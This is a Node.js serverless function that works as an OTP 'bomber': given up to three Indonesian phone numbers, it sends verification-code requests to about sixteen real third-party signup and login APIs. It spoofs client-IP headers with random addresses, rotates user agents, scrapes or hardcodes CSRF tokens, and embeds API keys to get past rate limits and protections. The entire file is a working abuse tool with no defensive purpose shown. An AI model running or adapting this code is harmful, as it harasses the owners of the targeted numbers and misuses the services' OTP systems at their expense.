const axios = require('axios');
const { randomUUID, randomInt } = require('crypto');

const CONFIG = {
  timeout: 45000,
  retries: 1
};

const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Firefox/120.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Safari/604.1',
  'Mozilla/5.0 (Linux; Android 14; SM-S921B) Chrome/120.0.0.0 Mobile Safari/537.36'
];

function randomUA() { return USER_AGENTS[randomInt(0, USER_AGENTS.length - 1)]; }

function normalizePhone(phone) {
  let p = phone.replace(/[^0-9]/g, '');
  if (p.startsWith('0')) p = '62' + p.slice(1);
  if (!p.startsWith('62')) p = '62' + p;
  return p;
}

function generateEmail() {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < 10; i++) result += chars.charAt(randomInt(0, chars.length - 1));
  return `${result}@bwmyga.com`;
}

function randomIP() {
  return `${randomInt(1,255)}.${randomInt(1,255)}.${randomInt(1,255)}.${randomInt(1,255)}`;
}

async function getPinhomeCSRF() {
  try {
    const resp = await axios.get('https://www.pinhome.id/daftar', {
      headers: { 'User-Agent': randomUA() },
      timeout: 10000
    });
    let csrfToken = '';
    let cookieString = '';
    const cookies = resp.headers['set-cookie'] || [];
    cookies.forEach(c => {
      const parts = c.split(';');
      const nameValue = parts[0];
      cookieString += nameValue + '; ';
      if (nameValue.includes('_X7kCsrf')) csrfToken = nameValue.split('=')[1];
    });
    if (!csrfToken) {
      const html = resp.data;
      const match = html.match(/"csrfToken":"([^"]+)"/) || html.match(/name="csrf-token" content="([^"]+)"/);
      if (match) csrfToken = match[1];
    }
    if (!csrfToken) {
      csrfToken = 'v4.local.5DA4oydS9lBboyNDmZ8KRpqTmC1KjU1TNS7sFGkUbxA7bewqbsFXq2M7Fgfa9QZvzE3rMwFS1iWEAnr1maz0_UqbdUxJTQ7ZI-SDX4JyRv2crVkidEZf9PXheBwQDzF_5mAhHty7W45QcxHnsZmxH0WeYt7ex-YJFAeFS5aOspraWFxaMLh7ZgPU4OarH6kZs7zAW1-1NfBH3al3SATpixJ9hUj-jA5yJgcsOdDSSsOGXk8';
      cookieString = '_X7kCsrf=' + csrfToken + '; _ga=GA1.1.1752313616.1783394371';
    }
    return { csrfToken, cookieString };
  } catch(e) {
    return {
      csrfToken: 'v4.local.5DA4oydS9lBboyNDmZ8KRpqTmC1KjU1TNS7sFGkUbxA7bewqbsFXq2M7Fgfa9QZvzE3rMwFS1iWEAnr1maz0_UqbdUxJTQ7ZI-SDX4JyRv2crVkidEZf9PXheBwQDzF_5mAhHty7W45QcxHnsZmxH0WeYt7ex-YJFAeFS5aOspraWFxaMLh7ZgPU4OarH6kZs7zAW1-1NfBH3al3SATpixJ9hUj-jA5yJgcsOdDSSsOGXk8',
      cookieString: '_X7kCsrf=v4.local.5DA4oydS9lBboyNDmZ8KRpqTmC1KjU1TNS7sFGkUbxA7bewqbsFXq2M7Fgfa9QZvzE3rMwFS1iWEAnr1maz0_UqbdUxJTQ7ZI-SDX4JyRv2crVkidEZf9PXheBwQDzF_5mAhHty7W45QcxHnsZmxH0WeYt7ex-YJFAeFS5aOspraWFxaMLh7ZgPU4OarH6kZs7zAW1-1NfBH3al3SATpixJ9hUj-jA5yJgcsOdDSSsOGXk8; _ga=GA1.1.1752313616.1783394371'
    };
  }
}

async function getOTPEndpoints(phone, clientIP) {
  const p08 = '0' + phone.slice(2);
  const p62 = phone;
  const pNoCountry = phone.replace('62', '');
  const deviceId = randomUUID();
  const requestId = randomUUID();
  const email = generateEmail();
  const csrfData = await getPinhomeCSRF();

  const baseHeaders = {
    'User-Agent': randomUA(),
    'X-Forwarded-For': clientIP || randomIP(),
    'X-Real-IP': clientIP || randomIP(),
    'CF-Connecting-IP': clientIP || randomIP(),
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8',
    'Connection': 'keep-alive'
  };

  return [
    { url: 'https://api.maulagi.id/api/v2/auth/check', data: { credentials: p62 }, headers: { ...baseHeaders, 'X-ML-KEY': 'B10JLPEP10' } },
    { url: 'https://matahari-backend-prod.matahari.com/api/auth/re-activation', data: { mobileCountryCode: '', mobileNumber: p08, activationCode: '' }, headers: baseHeaders },
    { url: 'https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp', data: { accountType: 'customers', applicationType: 'Pinhome Web', countryCode: '62', medium: 'whatsapp', otpType: 'register', phoneNumber: pNoCountry }, headers: { ...baseHeaders, 'x-csrf-token': csrfData.csrfToken, 'Cookie': csrfData.cookieString, 'Origin': 'https://www.pinhome.id', 'Referer': 'https://www.pinhome.id/daftar', 'Content-Type': 'text/plain;charset=UTF-8' } },
    { url: 'https://www.bonusbelanja.com/api/auth/registration/app', data: { phone: p62, name: 'User', agreeTnc: true, agreeContact: false }, headers: baseHeaders },
    { url: 'https://www.alodokter.com/resend-otp', data: { user: { phone: p08, uuid: randomUUID() }, request_via: 'whatsapp' }, headers: baseHeaders },
    { url: 'https://www.beautyhaul.com/ajax/account/send_otp', data: { method: 'WhatsApp', phone: p62 }, headers: baseHeaders },
    { url: 'https://gateway.gritero.com/v1/auth/registration/whatsapp/send-otp?langcode=id', data: { nama_lengkap: 'User', telepon: p08, email: `user${randomInt(1000,9999)}@mail.com` }, headers: { ...baseHeaders, 'Xid': String(randomInt(1000000, 9999999)), 'source': 'ocistok' } },
    { url: 'https://api.duniagames.co.id/api/other/api/v1/content/', data: null, method: 'GET', headers: { ...baseHeaders, 'Accept-Language': 'id', 'x-device': deviceId, 'Ciam-Type': 'FR' } },
    { url: 'https://internetrakyat.id/api/app/auth/send-otp-register', data: { phone_number: p08 }, headers: { ...baseHeaders, 'x-api-key': '280999!FTTH', 'Origin': 'https://internetrakyat.id', 'Referer': 'https://internetrakyat.id/auth/register' } },
    { url: 'https://api.dokterin.id/user/v1/users/login', data: { phone: p62, tnc_accept: true, device_id: randomUUID() }, headers: { ...baseHeaders, 'Origin': 'https://dokterin.id', 'Referer': 'https://dokterin.id/login' } },
    { url: 'https://api.paper.id/api/v1/auth/login', data: { method: 'whatsapp', phone: p08 }, headers: { ...baseHeaders, 'Origin': 'https://www.paper.id', 'Referer': 'https://www.paper.id/', 'x-paper-user-agent': 'Jupiter/7.19.5 desktop (windows) Firefox 152', 'request-id': requestId } },
    { url: 'https://api.indodax.com/api/v1/otp/send', data: { email, flow: 'register', method: 'whatsapp', old_uuid: '' }, headers: { ...baseHeaders, 'Origin': 'https://indodax.com', 'Referer': 'https://indodax.com/', 'key': 'bAGUG2WiLy', 'authorization': 'Bearer bAGUG2WiLy' } },
    { url: 'https://cms.bunda.co.id/api/v1/auth/send-otp', data: { phone_number: p62, type: 'auth' }, headers: { ...baseHeaders, 'Origin': 'https://www.bunda.co.id', 'Referer': 'https://www.bunda.co.id/id', 'X-Requested-With': 'XMLHttpRequest', 'X-Locale': 'id' } },
    { url: 'https://api.fastwork.id/auth/v2/signup.sendVerificationCode', data: { phone_number: p08 }, headers: baseHeaders },
    { url: 'https://saturdays.com/api/v1/auth/otp', data: { phone: p62, type: 'register' }, headers: baseHeaders },
    { url: 'https://api.saturdays.com/v2/user/otp/request', data: { phoneNumber: p62, channel: 'whatsapp' }, headers: baseHeaders }
  ];
}

async function sendRequest(endpoint, idx, phone) {
  const hostname = new URL(endpoint.url).hostname;
  const headers = endpoint.headers || {};

  await new Promise(resolve => setTimeout(resolve, randomInt(1000, 3000)));

  for (let attempt = 0; attempt <= CONFIG.retries; attempt++) {
    try {
      const config = { headers, timeout: CONFIG.timeout };
      let resp;
      if (endpoint.method === 'GET') {
        resp = await axios.get(endpoint.url, config);
      } else {
        resp = await axios.post(endpoint.url, endpoint.data, config);
      }

      let responseBody = {};
      try { responseBody = resp.data; } catch(e) {}

      if ([200, 201, 202, 204].includes(resp.status)) {
        return { success: true, hostname };
      }

      if (responseBody && (responseBody.success === true || responseBody.status === 'success' ||
          responseBody.statusCode === 200 || responseBody.status === 202 ||
          responseBody.is_success === true ||
          responseBody.message === 'OTP terkirim' || responseBody.message === 'OTP sent successfully' ||
          responseBody.message === 'Success.' ||
          (responseBody.data && (responseBody.data.otp === 'processed' || responseBody.data.new_uuid || responseBody.data.status === 1)) ||
          responseBody.secretCode)) {
        return { success: true, hostname };
      }

      if (resp.status === 429) {
        await new Promise(resolve => setTimeout(resolve, 30000));
        continue;
      }

      if (attempt < CONFIG.retries) {
        await new Promise(resolve => setTimeout(resolve, 5000));
        continue;
      }

    } catch(e) {
      if (attempt < CONFIG.retries) {
        await new Promise(resolve => setTimeout(resolve, 5000));
        continue;
      }
    }
  }
  return { success: false, hostname };
}

async function spamNumber(phone, clientIP) {
  const normalized = normalizePhone(phone);
  const endpoints = await getOTPEndpoints(normalized, clientIP);
  const results = [];

  for (let i = 0; i < endpoints.length; i++) {
    const result = await sendRequest(endpoints[i], i + 1, normalized);
    results.push(result);
  }

  const success = results.filter(r => r.success).length;
  const failed = results.filter(r => !r.success).length;

  return {
    phone: normalized,
    total: endpoints.length,
    success,
    failed,
    results: results.map(r => ({ hostname: r.hostname, status: r.success ? '✅' : '❌' }))
  };
}

module.exports = async (req, res) => {
  // CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { phones } = req.body;
    
    if (!phones || !Array.isArray(phones) || phones.length === 0 || phones.length > 3) {
      return res.status(400).json({ error: 'Kirim 1-3 nomor di array "phones"' });
    }

    const clientIP = req.headers['cf-connecting-ip'] || 
                     req.headers['x-forwarded-for']?.split(',')[0] || 
                     req.headers['x-real-ip'] || 
                     req.socket?.remoteAddress || 
                     randomIP();

    const promises = phones.map(phone => spamNumber(phone, clientIP));
    const results = await Promise.all(promises);

    const totalSuccess = results.reduce((acc, r) => acc + r.success, 0);
    const totalFailed = results.reduce((acc, r) => acc + r.failed, 0);

    return res.status(200).json({
      status: 'success',
      client_ip: clientIP,
      summary: {
        total_numbers: results.length,
        total_success: totalSuccess,
        total_failed: totalFailed
      },
      details: results
    });

  } catch (error) {
    return res.status(500).json({ error: error.message || 'Internal server error' });
  }
};